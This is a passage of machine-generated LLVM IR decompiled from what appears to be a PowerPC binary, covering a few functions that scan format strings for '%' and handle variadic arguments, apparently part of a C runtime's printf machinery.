  %v4_10005fb4 = call i32 @function_10005888(i32 %v0_10005fa8, i8 32, i32 %v0_10005fb0)
  %v1_10005fb8 = load i32, i32* @r28, align 4
  %v4_10005fb8 = icmp eq i32 %v4_10005fb4, %v1_10005fb8
  br i1 %v4_10005fb8, label %dec_label_pc_10005fc0, label %dec_label_pc_10005fd4

dec_label_pc_10005fc0:                            ; preds = %dec_label_pc_10005fa8, %dec_label_pc_10005d10, %dec_label_pc_10005ae8
  %stack_var_-184.2 = phi i32 [ %v0_10005c18, %dec_label_pc_10005ae8 ], [ %stack_var_-184.1, %dec_label_pc_10005fa8 ], [ %v0_10005c18, %dec_label_pc_10005d10 ]
  %v3_10005fc0 = load i8*, i8** %stack_var_-200, align 4
  %v4_10005fc0 = ptrtoint i8* %v3_10005fc0 to i32
  store i32 %v4_10005fc0, i32* @r29, align 4
  br label %dec_label_pc_10005fc4

dec_label_pc_10005fc4:                            ; preds = %dec_label_pc_100059e0, %dec_label_pc_10005fc0
  %v0_10005fc4 = phi i32 [ %v0_10005fc4.pre, %dec_label_pc_100059e0 ], [ %v4_10005fc0, %dec_label_pc_10005fc0 ]
  %v0_10005c18 = phi i32 [ %tmp56, %dec_label_pc_100059e0 ], [ %stack_var_-184.2, %dec_label_pc_10005fc0 ]
  br label %dec_label_pc_100059f8

dec_label_pc_10005fd4:                            ; preds = %dec_label_pc_10005e2c, %dec_label_pc_10005fa8, %dec_label_pc_10005f38, %dec_label_pc_10005ee4, %dec_label_pc_10005ec8, %dec_label_pc_10005d88, %dec_label_pc_10005d58, %dec_label_pc_10005cec, %dec_label_pc_10005a34, %dec_label_pc_10005f80
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005fd8

dec_label_pc_10005fd8:                            ; preds = %dec_label_pc_10005a40, %dec_label_pc_100059b8, %dec_label_pc_100059d0, %dec_label_pc_10005fd4
  store i32 %v0_1000598c, i32* %r0.global-to-local, align 4
  %v0_10005fdc = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10005fdc

; uselistorder directives
  uselistorder i32 %v0_10005c18, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10005f50, { 2, 1, 0 }
  uselistorder i32 %v1_10005eb4, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10005e44, { 1, 0 }
  uselistorder i32 %v2_10005dd4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10005d34, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10005c18, { 1, 0 }
  uselistorder i32 %v6_10005bd0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10005bb4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10005ba0, { 1, 0 }
  uselistorder i32 %v1_10005b44, { 1, 0 }
  uselistorder i32 %v0_10005aec, { 1, 0, 2 }
  uselistorder i32 %v1_10005ad8, { 1, 0 }
  uselistorder i32 %v0_10005ad0, { 1, 0 }
  uselistorder i32 %v1_10005acc, { 1, 0 }
  uselistorder i32 %v1_10005a4c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10005a14, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10005a24, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10005e38, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v4_10005a84, { 1, 0 }
  uselistorder i32 %v2_10005a80, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp60, { 1, 0 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1, 8 }
  uselistorder i32* %r10.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 0, 1, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 (i32, i8, i32)* @function_10005888, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4 }
  uselistorder i32 ()* @function_10009b30, { 1, 0 }
  uselistorder label %dec_label_pc_10005fd8, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10005fd4, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10005fc4, { 1, 0 }
  uselistorder label %dec_label_pc_10005fa8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005f80, { 1, 0 }
  uselistorder label %dec_label_pc_10005ee4, { 1, 0 }
  uselistorder label %dec_label_pc_10005ebc, { 1, 0 }
  uselistorder label %dec_label_pc_10005ea4, { 1, 0 }
  uselistorder label %dec_label_pc_10005e90, { 1, 0 }
  uselistorder label %dec_label_pc_10005e70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005e70thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10005e64, { 1, 0 }
  uselistorder label %dec_label_pc_10005df4, { 1, 0 }
  uselistorder label %dec_label_pc_10005de0, { 1, 0 }
  uselistorder label %dec_label_pc_10005d58, { 1, 0 }
  uselistorder label %dec_label_pc_10005ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10005c90, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10005c40, { 1, 0 }
  uselistorder label %dec_label_pc_10005c24, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10005bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10005b94, { 1, 0 }
  uselistorder label %dec_label_pc_10005b80, { 1, 0 }
  uselistorder label %dec_label_pc_10005b7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005b50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005adc, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10005aa0, { 1, 0 }
  uselistorder label %dec_label_pc_10005a40, { 1, 0 }
  uselistorder label %dec_label_pc_10005a34, { 1, 0 }
  uselistorder label %dec_label_pc_100059f8, { 1, 0 }
}

define i32 @function_10005ff0(i32* %arg1) local_unnamed_addr {
dec_label_pc_10005ff0:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10005ff4 = load i32, i32* @lr, align 4
  store i32 %v0_10005ff4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10006004 = load i32, i32* @r4, align 4
  store i32 %v0_10006004, i32* @r30, align 4
  store i32 268460052, i32* @lr, align 4
  %v3_10006010 = call i32 @function_100071a0(i32 0, i32 160, i32 160)
  %v0_10006014 = load i32, i32* @r31, align 4
  %v1_10006014 = add i32 %v0_10006014, 24
  %v2_10006014 = inttoptr i32 %v1_10006014 to i32*
  %v3_10006014 = load i32, i32* %v2_10006014, align 4
  store i32 %v3_10006014, i32* %r9.global-to-local, align 4
  %v1_10006018 = add i32 %v0_10006014, 40
  store i32 %v1_10006018, i32* %r11.global-to-local, align 4
  %v0_1000601c = load i32, i32* @r30, align 4
  %v2_1000601c = inttoptr i32 %v0_10006014 to i32*
  store i32 %v0_1000601c, i32* %v2_1000601c, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v0_10006024 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006024 = add i32 %v0_10006024, -1
  %v1_10006028 = load i32, i32* @r31, align 4
  %v2_10006028 = add i32 %v1_10006028, 24
  %v3_10006028 = inttoptr i32 %v2_10006028 to i32*
  store i32 %v1_10006024, i32* %v3_10006028, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v1_10006034.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006034

dec_label_pc_10006034:                            ; preds = %dec_label_pc_10006034, %dec_label_pc_10005ff0
  %v1_10006034 = phi i32 [ %v1_10006038, %dec_label_pc_10006034 ], [ %v1_10006034.pre, %dec_label_pc_10005ff0 ]
  %v0_10006034 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006034 = inttoptr i32 %v1_10006034 to i32*
  store i32 %v0_10006034, i32* %v2_10006034, align 4
  %v0_10006038 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006038 = add i32 %v0_10006038, 4
  store i32 %v1_10006038, i32* %r11.global-to-local, align 4
  %v0_1000603c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000603c = add i32 %v0_1000603c, -1
  store i32 %v1_1000603c, i32* %ctr.global-to-local, align 4
  %v2_1000603c = icmp eq i32 %v1_1000603c, 0
  br i1 %v2_1000603c, label %dec_label_pc_10006040, label %dec_label_pc_10006034

dec_label_pc_10006040:                            ; preds = %dec_label_pc_10006034
  %v0_10006040 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006080

dec_label_pc_10006050:                            ; preds = %dec_label_pc_10006080
  %v3_10006088 = icmp eq i8 %v2_10006080, 37
  br i1 %v3_10006088, label %dec_label_pc_10006054, label %dec_label_pc_1000607c

dec_label_pc_10006054:                            ; preds = %dec_label_pc_10006050
  %v1_10006054 = add i32 %v0_10006054, 1
  %v2_10006054 = inttoptr i32 %v1_10006054 to i8*
  %v3_10006054 = load i8, i8* %v2_10006054, align 1
  %v4_10006054 = zext i8 %v3_10006054 to i32
  store i32 %v4_10006054, i32* %r0.global-to-local, align 4
  store i32 %v1_10006054, i32* %r9.global-to-local, align 4
  %v3_1000605c = icmp eq i8 %v3_10006054, 37
  br i1 %v3_1000605c, label %dec_label_pc_1000607c, label %dec_label_pc_10006064

dec_label_pc_10006064:                            ; preds = %dec_label_pc_10006054
  %v0_10006058 = load i32, i32* @r31, align 4
  %v2_10006064 = inttoptr i32 %v0_10006058 to i32*
  store i32 %v1_10006054, i32* %v2_10006064, align 4
  store i32 268460140, i32* @lr, align 4
  %v1_10006068 = load i32, i32* %r9.global-to-local, align 4
  %v3_10006068 = call i32 @function_100063b8(i32* %v2_10006064, i32 %v1_10006068)
  %v1_1000606c = icmp slt i32 %v3_10006068, 0
  br i1 %v1_1000606c, label %dec_label_pc_10006098, label %dec_label_pc_10006074

dec_label_pc_10006074:                            ; preds = %dec_label_pc_10006064
  %v0_10006074 = load i32, i32* @r31, align 4
  %v1_10006074 = inttoptr i32 %v0_10006074 to i32*
  %v2_10006074 = load i32, i32* %v1_10006074, align 4
  br label %dec_label_pc_10006080

dec_label_pc_1000607c:                            ; preds = %dec_label_pc_10006050, %dec_label_pc_10006054
  %v0_1000607c = phi i32 [ %v0_10006054, %dec_label_pc_10006050 ], [ %v1_10006054, %dec_label_pc_10006054 ]
  %v1_1000607c = add i32 %v0_1000607c, 1
  br label %dec_label_pc_10006080

dec_label_pc_10006080:                            ; preds = %dec_label_pc_10006074, %dec_label_pc_1000607c, %dec_label_pc_10006040
  %v0_10006054 = phi i32 [ %v0_10006040, %dec_label_pc_10006040 ], [ %v1_1000607c, %dec_label_pc_1000607c ], [ %v2_10006074, %dec_label_pc_10006074 ]
  store i32 %v0_10006054, i32* %r9.global-to-local, align 4
  %v1_10006080 = inttoptr i32 %v0_10006054 to i8*
  %v2_10006080 = load i8, i8* %v1_10006080, align 1
  %v3_10006080 = zext i8 %v2_10006080 to i32
  store i32 %v3_10006080, i32* %r0.global-to-local, align 4
  %v3_10006084 = icmp eq i8 %v2_10006080, 0
  br i1 %v3_10006084, label %dec_label_pc_10006090, label %dec_label_pc_10006050

dec_label_pc_10006090:                            ; preds = %dec_label_pc_10006080
  %v0_10006090 = load i32, i32* @r30, align 4
  %v1_10006090 = load i32, i32* @r31, align 4
  %v2_10006090 = inttoptr i32 %v1_10006090 to i32*
  store i32 %v0_10006090, i32* %v2_10006090, align 4
  br label %dec_label_pc_10006098

dec_label_pc_10006098:                            ; preds = %dec_label_pc_10006064, %dec_label_pc_10006090
  %storemerge = phi i32 [ 0, %dec_label_pc_10006090 ], [ -1, %dec_label_pc_10006064 ]
  store i32 %v0_10005ff4, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10006080, { 1, 2, 0 }
  uselistorder i32 %v0_10006054, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000603c, { 1, 0 }
  uselistorder i32 %v1_10006038, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10006098, { 1, 0 }
  uselistorder label %dec_label_pc_10006080, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000607c, { 1, 0 }
}

define i32 @function_100060ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100060ac:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100060b0 = load i32, i32* @lr, align 4
  %v0_100060b4 = load i32, i32* @r3, align 4
  store i32 %v0_100060b4, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100060d0 = add i32 %v0_100060b4, 24
  %v2_100060d0 = inttoptr i32 %v1_100060d0 to i32*
  %v3_100060d0 = load i32, i32* %v2_100060d0, align 4
  store i32 %v3_100060d0, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_100060d0, 1
  br i1 %tmp4, label %dec_label_pc_100060f4, label %dec_label_pc_100060dc

dec_label_pc_100060dc:                            ; preds = %dec_label_pc_100060ac
  %v2_100060dc = add i32 %v0_100060b4, 8
  %v3_100060dc = inttoptr i32 %v2_100060dc to i32*
  store i32 0, i32* %v3_100060dc, align 4
  %v0_100060e0 = load i32, i32* @r30, align 4
  %v1_100060e0 = load i32, i32* @r3, align 4
  %v2_100060e0 = add i32 %v1_100060e0, 28
  %v3_100060e0 = inttoptr i32 %v2_100060e0 to i32*
  store i32 %v0_100060e0, i32* %v3_100060e0, align 4
  %v0_100060e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100060e4 = load i32, i32* @r3, align 4
  %v2_100060e4 = add i32 %v1_100060e4, 24
  %v3_100060e4 = inttoptr i32 %v2_100060e4 to i32*
  store i32 %v0_100060e4, i32* %v3_100060e4, align 4
  %v0_100060e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100060e8 = load i32, i32* @r3, align 4
  %v2_100060e8 = add i32 %v1_100060e8, 4
  %v3_100060e8 = inttoptr i32 %v2_100060e8 to i32*
  store i32 %v0_100060e8, i32* %v3_100060e8, align 4
  store i32 268460272, i32* @lr, align 4
  %v0_100060ec = call i32 @function_10006108()
  store i32 %v0_100060ec, i32* %r3.global-to-local, align 4
  %v0_100060f0 = load i32, i32* @r30, align 4
  %v1_100060f0 = load i32, i32* @r31, align 4
  %v2_100060f0 = add i32 %v1_100060f0, 24
  %v3_100060f0 = inttoptr i32 %v2_100060f0 to i32*
  store i32 %v0_100060f0, i32* %v3_100060f0, align 4
  %v0_10006104.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100060f4

dec_label_pc_100060f4:                            ; preds = %dec_label_pc_100060ac, %dec_label_pc_100060dc
  %v0_10006104 = phi i32 [ %v0_100060b4, %dec_label_pc_100060ac ], [ %v0_10006104.pre, %dec_label_pc_100060dc ]
  store i32 %v0_100060b0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10006104

; uselistorder directives
  uselistorder i32 ()* @function_10006108, { 1, 0 }
  uselistorder label %dec_label_pc_100060f4, { 1, 0 }
}

define i32 @function_10006108() local_unnamed_addr {
dec_label_pc_10006108:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10006108 = load i32, i32* @r3, align 4
  %v1_10006108 = add i32 %v0_10006108, 24
  %v2_10006108 = inttoptr i32 %v1_10006108 to i32*
  %v3_10006108 = load i32, i32* %v2_10006108, align 4
  store i32 %v3_10006108, i32* %r0.global-to-local, align 4
  %v1_1000610c = add i32 %v0_10006108, 88
  store i32 %v1_1000610c, i32* %r8.global-to-local, align 4
  %v1_10006110 = add i32 %v0_10006108, 8
  %v2_10006110 = inttoptr i32 %v1_10006110 to i32*
  %v3_10006110 = load i32, i32* %v2_10006110, align 4
  store i32 %v3_10006110, i32* %r9.global-to-local, align 4
  %v2_10006114 = icmp sgt i32 %v3_10006108, 0
  %v3_10006114 = icmp eq i32 %v3_10006108, 0
  store i1 %v2_10006114, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10006114, label %dec_label_pc_1000611c, label %dec_label_pc_10006308

dec_label_pc_1000611c:                            ; preds = %dec_label_pc_10006108
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10006120 = icmp ne i32 %v3_10006110, -2147483648
  %v4_10006120 = icmp eq i32 %v3_10006110, -2147483648
  store i1 %v3_10006120, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006120, label %dec_label_pc_10006128, label %dec_label_pc_10006168

dec_label_pc_10006128:                            ; preds = %dec_label_pc_1000611c
  %v1_10006128 = add i32 %v0_10006108, 76
  %v2_10006128 = inttoptr i32 %v1_10006128 to i8*
  %v3_10006128 = load i8, i8* %v2_10006128, align 1
  %v4_10006128 = zext i8 %v3_10006128 to i32
  store i32 %v4_10006128, i32* %r11.global-to-local, align 4
  store i32 %v1_10006128, i32* %r10.global-to-local, align 4
  %v2_10006130 = icmp ugt i8 %v3_10006128, 8
  store i1 %v2_10006130, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10006128, 7
  br i1 %tmp, label %dec_label_pc_10006150, label %dec_label_pc_10006138

dec_label_pc_10006138:                            ; preds = %dec_label_pc_10006128
  %v1_10006138 = add i32 %v0_10006108, 84
  %v2_10006138 = inttoptr i32 %v1_10006138 to i32*
  %v3_10006138 = load i32, i32* %v2_10006138, align 4
  store i32 %v3_10006138, i32* %r0.global-to-local, align 4
  %v1_1000613c = mul nuw nsw i32 %v4_10006128, 4
  store i32 %v1_1000613c, i32* %r9.global-to-local, align 4
  %v1_10006140 = add nuw nsw i32 %v4_10006128, 1
  store i32 %v1_10006140, i32* %r11.global-to-local, align 4
  %v1_10006144 = trunc i32 %v1_10006140 to i8
  store i8 %v1_10006144, i8* %v2_10006128, align 1
  %v0_10006148 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006148 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006148 = add i32 %v1_10006148, %v0_10006148
  store i32 %v2_10006148, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000615c

dec_label_pc_10006150:                            ; preds = %dec_label_pc_10006128
  %v1_10006150 = add i32 %v0_10006108, 80
  %v2_10006150 = inttoptr i32 %v1_10006150 to i32*
  %v3_10006150 = load i32, i32* %v2_10006150, align 4
  store i32 %v3_10006150, i32* %r9.global-to-local, align 4
  %v1_10006154 = add i32 %v3_10006150, 4
  store i32 %v1_10006154, i32* %r0.global-to-local, align 4
  store i32 %v1_10006154, i32* %v2_10006150, align 4
  %v0_1000615c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000615c

dec_label_pc_1000615c:                            ; preds = %dec_label_pc_10006138, %dec_label_pc_10006150
  %v0_1000615c = phi i32 [ %v2_10006148, %dec_label_pc_10006138 ], [ %v0_1000615c.pre, %dec_label_pc_10006150 ]
  %v1_1000615c = inttoptr i32 %v0_1000615c to i32*
  %v2_1000615c = load i32, i32* %v1_1000615c, align 4
  store i32 %v2_1000615c, i32* %r0.global-to-local, align 4
  %v1_10006160 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006160 = inttoptr i32 %v1_10006160 to i32*
  store i32 %v2_1000615c, i32* %v2_10006160, align 4
  %v0_10006164 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006164 = load i32, i32* @r3, align 4
  %v2_10006164 = add i32 %v1_10006164, 8
  %v3_10006164 = inttoptr i32 %v2_10006164 to i32*
  store i32 %v0_10006164, i32* %v3_10006164, align 4
  %v0_10006168.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006168

dec_label_pc_10006168:                            ; preds = %dec_label_pc_1000611c, %dec_label_pc_1000615c
  %v2_10006194 = phi i32 [ %v0_10006108, %dec_label_pc_1000611c ], [ %v0_10006168.pre, %dec_label_pc_1000615c ]
  %v1_10006168 = add i32 %v2_10006194, 4
  %v2_10006168 = inttoptr i32 %v1_10006168 to i32*
  %v3_10006168 = load i32, i32* %v2_10006168, align 4
  store i32 %v3_10006168, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10006170 = icmp ne i32 %v3_10006168, -2147483648
  %v4_10006170 = icmp eq i32 %v3_10006168, -2147483648
  store i1 %v3_10006170, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006170, label %dec_label_pc_10006178, label %dec_label_pc_100062f8.preheader

dec_label_pc_10006178:                            ; preds = %dec_label_pc_10006168
  %v1_10006178 = add i32 %v2_10006194, 76
  %v2_10006178 = inttoptr i32 %v1_10006178 to i8*
  %v3_10006178 = load i8, i8* %v2_10006178, align 1
  %v4_10006178 = zext i8 %v3_10006178 to i32
  store i32 %v4_10006178, i32* %r11.global-to-local, align 4
  store i32 %v1_10006178, i32* %r10.global-to-local, align 4
  %v2_10006180 = icmp ugt i8 %v3_10006178, 8
  store i1 %v2_10006180, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_10006178, 7
  br i1 %tmp26, label %dec_label_pc_100061a0, label %dec_label_pc_10006188

dec_label_pc_10006188:                            ; preds = %dec_label_pc_10006178
  %v1_10006188 = add i32 %v2_10006194, 84
  %v2_10006188 = inttoptr i32 %v1_10006188 to i32*
  %v3_10006188 = load i32, i32* %v2_10006188, align 4
  store i32 %v3_10006188, i32* %r0.global-to-local, align 4
  %v1_1000618c = mul nuw nsw i32 %v4_10006178, 4
  store i32 %v1_1000618c, i32* %r9.global-to-local, align 4
  %v1_10006190 = add nuw nsw i32 %v4_10006178, 1
  store i32 %v1_10006190, i32* %r11.global-to-local, align 4
  %v1_10006194 = trunc i32 %v1_10006190 to i8
  store i8 %v1_10006194, i8* %v2_10006178, align 1
  %v0_10006198 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006198 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006198 = add i32 %v1_10006198, %v0_10006198
  store i32 %v2_10006198, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100061ac

dec_label_pc_100061a0:                            ; preds = %dec_label_pc_10006178
  %v1_100061a0 = add i32 %v2_10006194, 80
  %v2_100061a0 = inttoptr i32 %v1_100061a0 to i32*
  %v3_100061a0 = load i32, i32* %v2_100061a0, align 4
  store i32 %v3_100061a0, i32* %r9.global-to-local, align 4
  %v1_100061a4 = add i32 %v3_100061a0, 4
  store i32 %v1_100061a4, i32* %r0.global-to-local, align 4
  store i32 %v1_100061a4, i32* %v2_100061a0, align 4
  %v0_100061ac.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100061ac

dec_label_pc_100061ac:                            ; preds = %dec_label_pc_10006188, %dec_label_pc_100061a0
  %v0_100061ac = phi i32 [ %v2_10006198, %dec_label_pc_10006188 ], [ %v0_100061ac.pre, %dec_label_pc_100061a0 ]
  %v1_100061ac = inttoptr i32 %v0_100061ac to i32*
  %v2_100061ac = load i32, i32* %v1_100061ac, align 4
  store i32 %v2_100061ac, i32* %r0.global-to-local, align 4
  %v1_100061b0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100061b0 = inttoptr i32 %v1_100061b0 to i32*
  store i32 %v2_100061ac, i32* %v2_100061b0, align 4
  %v0_100061b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100061b4 = load i32, i32* @r3, align 4
  %v2_100061b4 = add i32 %v1_100061b4, 4
  %v3_100061b4 = inttoptr i32 %v2_100061b4 to i32*
  store i32 %v0_100061b4, i32* %v3_100061b4, align 4
  %v0_100062f85.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100062f8.preheader

dec_label_pc_100062f8.preheader:                  ; preds = %dec_label_pc_10006168, %dec_label_pc_100061ac
  %v0_100062f85 = phi i32 [ %v2_10006194, %dec_label_pc_10006168 ], [ %v0_100062f85.pre, %dec_label_pc_100061ac ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_100062f86 = add i32 %v0_100062f85, 28
  %v2_100062f87 = inttoptr i32 %v1_100062f86 to i32*
  %v3_100062f88 = load i32, i32* %v2_100062f87, align 4
  store i32 %v3_100062f88, i32* %r0.global-to-local, align 4
  %v2_100062fc9 = icmp sgt i32 %v3_100062f88, 0
  %v3_100062fc10 = icmp slt i32 %v3_100062f88, 0
  store i1 %v3_100062fc10, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100062fc9, label %dec_label_pc_100061c0, label %dec_label_pc_10006348

dec_label_pc_100061c0:                            ; preds = %dec_label_pc_100062f8.preheader, %dec_label_pc_100062f4
  %v2_100062d0 = phi i32 [ %v0_100062f8, %dec_label_pc_100062f4 ], [ %v0_100062f85, %dec_label_pc_100062f8.preheader ]
  %v0_100061c0 = phi i32 [ %v1_100062f4, %dec_label_pc_100062f4 ], [ 0, %dec_label_pc_100062f8.preheader ]
  %v1_100061c0 = mul i32 %v0_100061c0, 4
  %v2_100061c4 = add i32 %v1_100061c0, %v2_100062d0
  store i32 %v2_100061c4, i32* %r9.global-to-local, align 4
  %v1_100061c8 = add i32 %v2_100061c4, 40
  %v2_100061c8 = inttoptr i32 %v1_100061c8 to i32*
  %v3_100061c8 = load i32, i32* %v2_100061c8, align 4
  store i32 %v3_100061c8, i32* %r0.global-to-local, align 4
  %v2_100061cc = icmp sgt i32 %v3_100061c8, 8
  %v3_100061cc = icmp eq i32 %v3_100061c8, 8
  store i1 %v2_100061cc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100061cc, label %dec_label_pc_100062f4, label %dec_label_pc_100061d4

dec_label_pc_100061d4:                            ; preds = %dec_label_pc_100061c0
  %v1_100061d4 = add i32 %v2_100062d0, 76
  store i32 %v1_100061d4, i32* %r10.global-to-local, align 4
  br i1 %v2_100061cc, label %dec_label_pc_100061f0, label %dec_label_pc_100061dc

dec_label_pc_100061dc:                            ; preds = %dec_label_pc_100061d4
  %v2_100061dc = icmp sgt i32 %v3_100061c8, 2
  store i1 %v2_100061dc, i1* %cr7_gt.global-to-local, align 1
  %tmp27 = icmp slt i32 %v3_100061c8, 3
  br i1 %tmp27, label %dec_label_pc_100062b8, label %dec_label_pc_10006208

dec_label_pc_100061f0:                            ; preds = %dec_label_pc_100061d4
  %v2_100061f0 = icmp sgt i32 %v3_100061c8, 1024
  store i1 %v2_100061f0, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = icmp slt i32 %v3_100061c8, 1025
  br i1 %tmp28, label %dec_label_pc_100062b8, label %dec_label_pc_100061fc

dec_label_pc_100061fc:                            ; preds = %dec_label_pc_100061f0
  %v2_100061fc = icmp sgt i32 %v3_100061c8, 2048
  %v3_100061fc = icmp eq i32 %v3_100061c8, 2048
  store i1 %v2_100061fc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100061fc, label %dec_label_pc_10006210, label %dec_label_pc_10006204

dec_label_pc_10006204:                            ; preds = %dec_label_pc_100061fc
  %v2_10006204 = icmp sgt i32 %v3_100061c8, 2055
  %v3_10006204 = icmp eq i32 %v3_100061c8, 2055
  store i1 %v2_10006204, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10006204, label %dec_label_pc_1000626c, label %dec_label_pc_100062b8

dec_label_pc_10006208:                            ; preds = %dec_label_pc_100061dc
  %v3_100061e8 = icmp eq i32 %v3_100061c8, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100061e8, label %dec_label_pc_1000626c, label %dec_label_pc_100062b8

dec_label_pc_10006210:                            ; preds = %dec_label_pc_100061fc
  %v2_10006210 = inttoptr i32 %v1_100061d4 to i8*
  %v3_10006210 = load i8, i8* %v2_10006210, align 1
  %v4_10006210 = zext i8 %v3_10006210 to i32
  store i32 %v4_10006210, i32* %r0.global-to-local, align 4
  %tmp32 = urem i8 %v3_10006210, 2
  %v1_10006214 = zext i8 %tmp32 to i32
  %v2_10006218 = icmp ugt i8 %v3_10006210, 6
